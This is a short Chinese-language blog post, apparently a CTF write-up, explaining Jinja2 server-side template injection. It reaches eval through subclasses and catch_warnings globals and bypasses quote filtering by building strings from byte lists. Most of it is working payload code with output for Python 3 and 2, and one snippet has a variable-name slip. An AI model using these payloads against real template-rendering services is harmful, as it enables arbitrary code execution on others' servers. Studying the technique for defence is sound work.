Title: jinja2 模板注入绕过引号任意代码执行  
Tags: python, 小结  

###intro
不久前 plaidctf 中有一题模板注入， 但是引号会被过滤掉， 挣扎了很久， 非常痛苦， 到最后要用 eval 任意代码执行的时候想到不能有引号没有办法构造字符串， 岂不是依然 GG。~~（当然最后是用其他的方法~~

后来想了一下绕过引号的方法。

首先模板注入的原理是在 jinja2 中可以访问对象的属性，同时列表是存在的， 这样可以通过访问列表的属性一层层的找到其他类或者是`__buildtins__`, 然后找出 `eval`进行任意代码执行， 绕过沙盒的限制


```python
#! python3

from jinja2 import Template
Template('{}'.format('{{[].__class__}}')).render()

#output "<class 'list'>"
``` 

我们可以通过这种方法调用自带的函数或者对象， 通过`subclasses` 找到更加多的类

```python

[].__class__.__base__.__subclasses__()

print([].__class__.__base__.__subclasses__()[0])
#output type
```

之后利用其中的 `catch_warnings` 访问 globals 定位出 `eval`， 然后进行任意代码执行。



```python
#python3 

In [146]: [].__class__.__base__.__subclasses__()[166]
Out[146]: warnings.catch_warnings

In [153]: Template('{{[].__class__.__base__.__subclasses__()[166].__init__.__g
     ...: lobals__.__builtins__.eval("1+1")}}').render()
Out[153]: '2'
```


###绕过引号
一般情况下， `%`会被过滤， 但是如果引号也被过滤的话怎么构造出 eval 可以执行的字符串呢？

特别说明的是 `chr` 是没有办法在模板中调用的。因为在沙盒中这个函数是不存在的。（`chr`？不存在的。）

我们可以使用数字列表转化成字节流， 之后转化成字符串的方法。
 

利用`bytes`， 但是 python3和 python2略有不同

```python
# python3

In [156]: bytes([49, 43, 49])
Out[156]: b'1+1'

In [157]: eval(bytes([49, 43, 49]))
Out[157]: 2
```

####python3
利用：

```python
from jinja2 import Template

attack_str = '__import__("sys").version'
attack_list = [ord(i) for i in attack]
attack_input='{{' + '[].__class__.__base__.__subclasses__()[166].__init__.__globals__.__builtins__.eval([].__class__.__base__.__subclasses__()[6]({attack_list}))'.format(attack_list=attack_list) + '}}'

print(attack_input)
#output {{[].__class__.__base__.__subclasses__()[166].__init__.__globals__.__builtins__.eval([].__class__.__base__.__subclasses__()[6]([95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 115, 121, 115, 34, 41, 46, 118, 101, 114, 115, 105, 111, 110]))}}

Template('{user_input}'.format(user_input=attack_input)).render()

#output '3.6.1 (default, Mar 23 2017, 16:49:06) \n[GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.42.1)]'


```

####python2

python2 的`catch_warnings`在`[59]`的位置， 另外 python2 的 eval 不接受字节流， 需要特别调用`__str__`方法来转化成字符串。其余和 python3相同。

```python
Template('{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__.__builtins__.eval([].__class__.__base__.__subclasses__()[6]([95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 115, 121, 115, 34, 41, 46, 118, 101, 114, 115, 105, 111, 110]).__str__())}}').render()

#output u'2.7.10 (default, Feb  6 2017, 23:53:20) \n[GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]'
```

---
2017-05-01 20:33:47